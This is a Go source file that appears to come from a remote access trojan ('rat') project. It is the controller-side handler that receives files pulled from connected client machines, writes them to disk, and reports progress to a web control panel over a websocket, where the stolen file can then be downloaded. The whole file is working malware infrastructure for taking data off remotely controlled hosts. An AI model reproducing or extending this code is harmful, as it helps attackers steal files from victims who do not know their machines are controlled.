package main

import (
	"encoding/json"
	"io"
	"os"
	"rat/common"

	"path/filepath"

	"golang.org/x/net/websocket"
)

type Transfer struct {
	Local  *os.File
	Remote string
	Read   int64
	Total  int64
}

func (t *Transfer) Complete() bool {
	return t.Read == t.Total
}

type TransfersMap map[string]*Transfer

var Transfers TransfersMap

func init() {
	Transfers = make(TransfersMap)
}

type DownloadPacket struct {
	File string
}

func (packet DownloadPacket) GetHeader() common.PacketHeader {
	return common.GetFileHeader
}

func (packet DownloadPacket) Write(c *Client) error {
	return c.WriteString(packet.File)
}

func (packet DownloadPacket) Read(c *Client) error {
	file, err := c.ReadString()
	total, err := c.ReadInt64()
	if err != nil {
		return err
	}

	final, err := c.ReadBool()

	len, err := c.ReadInt()
	b := make([]byte, len)
	io.ReadFull(c.Conn, b)

	transfer := Transfers[file]
	transfer.Total = total
	transfer.Read += int64(len)
	_, err = transfer.Local.Write(b)

	if err != nil {
		return err
	}

	if ws, ok := c.Listeners[common.GetFileHeader]; ok {
		e := DownloadProgressEvent{file, transfer.Read, transfer.Total, ""}

		if transfer.Complete() && final {
			// Set temp file mapping so that we can download it from the web panel
			tempKey := addDownload(TempFile{
				Path: transfer.Local.Name(),
				Name: filepath.Base(file),
			})

			e.Key = tempKey
		}

		data, err := json.Marshal(&e)
		event := newEvent(DownloadProgressUpdateEvent, c.Id, string(data))

		err = websocket.JSON.Send(ws, &event)

		if err != nil {
			return err
		}
	}

	if final {
		err = transfer.Local.Sync()
		if err != nil {
			return err
		}

		err = transfer.Local.Close()
		if err != nil {
			return err
		}

		delete(Transfers, file)
		delete(c.Listeners, common.GetFileHeader)

		return nil
	}

	return err
}
